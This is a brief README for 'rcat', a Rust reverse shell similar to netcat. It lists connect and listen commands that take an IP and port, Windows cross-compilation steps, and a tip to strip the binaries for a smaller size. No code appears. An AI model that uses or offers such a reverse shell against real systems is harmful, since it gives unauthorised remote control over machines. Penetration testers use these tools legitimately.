# rcat

Simple rust reverse shell, similar to nc.

## usage

rcat connect <ip> <port>
rcat listen <ip> <port>
rcat_ip_port

## compile

rustup target add x86_64-pc-windows-gnu
rustup toolchain install stable-x86_64-pc-windows-gnu

Windows:
cargo build --release --target x86_64-pc-windows-gnu

Linux:
cargo build --release

To reduce the filesize further, you can strip the binaries with `strip`.